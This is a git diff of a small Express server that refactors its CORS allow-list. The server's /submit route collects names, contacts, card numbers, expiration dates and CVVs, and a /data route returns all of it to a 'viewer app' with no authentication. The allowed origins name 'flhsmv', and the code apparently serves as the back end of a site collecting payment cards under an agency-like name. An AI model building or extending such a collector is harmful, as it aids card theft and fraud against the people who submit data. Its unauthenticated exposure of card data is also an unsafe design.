@@ -1,26 +1,39 @@
 const express = require("express");
 const cors = require("cors");
-const bodyParser = require("body-parser");
 require("dotenv").config();
 
 const app = express();
 const port = process.env.PORT || 4000;
 
-// ✅ Allow all origins during testing or explicitly allow Vercel domain
+// Define allowed origins:
+const allowedOrigins = [
+  "https://flhsmv-admin.vercel.app",
+  "http://localhost:3000",
+  "https://flhsmv.onrender.com"
+];
+
+// Setup CORS with a custom callback
 app.use(cors({
-  origin: [
-    "https://flhsmv-admin.vercel.app", 
-    "http://localhost:3000",   
-     "https://flhsmv.onrender.com" 
-  ]
+  origin: function (origin, callback) {
+    // Allow requests with no origin (like curl, Postman, etc.)
+    if (!origin) return callback(null, true);
+    if (allowedOrigins.indexOf(origin) !== -1) {
+      // Origin is allowed
+      return callback(null, true);
+    } else {
+      // Origin is not allowed
+      return callback(new Error("Not allowed by CORS"));
+    }
+  }
 }));
 
-app.use(bodyParser.json());
+// Use the built-in JSON parser
+app.use(express.json());
 
-// ✅ In-memory storage (will reset on redeploy)
+// In-memory storage (resets on redeploy)
 let storage = [];
 
-// ✅ POST route for submissions
+// POST route for submissions
 app.post("/submit", (req, res) => {
   const { name, email, phone, subject, message, cardNumber, expirationDate, cvv } = req.body;
 
@@ -42,20 +55,20 @@ app.post("/submit", (req, res) => {
     return res.status(200).json({ message: "Contact data stored successfully" });
   }
 
-  res.status(400).json({ message: "Invalid or incomplete data submitted." });
+  return res.status(400).json({ message: "Invalid or incomplete data submitted." });
 });
 
-// ✅ GET route for viewer app to fetch all data
+// GET route for viewer app to fetch all data
 app.get("/data", (req, res) => {
   res.status(200).json(storage);
 });
 
-// ✅ Health check
+// Health check endpoint
 app.get("/ping", (req, res) => {
   res.status(200).json({ message: "Viewer app connected successfully!" });
 });
 
-// ✅ Start server
+// Start the server
 app.listen(port, () => {
-  console.log(`Server running on http://localhost:${port}`);
+  console.log(`Server running on port ${port}`);
 });
